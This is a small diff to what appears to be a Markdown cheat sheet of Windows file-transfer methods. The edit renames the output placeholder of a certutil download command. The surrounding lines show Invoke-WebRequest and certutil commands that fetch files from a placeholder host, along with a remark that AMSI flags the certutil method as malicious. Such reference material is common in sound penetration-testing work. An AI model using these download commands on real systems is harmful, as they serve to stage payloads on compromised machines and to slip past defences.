@@ -93,7 +93,7 @@ PS > Invoke-WebRequest https://<ip>[:PORT]/file -UseBasicParsing
 ```
 ## Certutil
 ```powershell
-PS > certutil -urlcache -f http://IP:PORT/file file_local
+PS > certutil -urlcache -f http://IP:PORT/file <OUTPUT>
 ```
 >**!! Note:** AMSI detects this as malicious
 ## BITSadmin
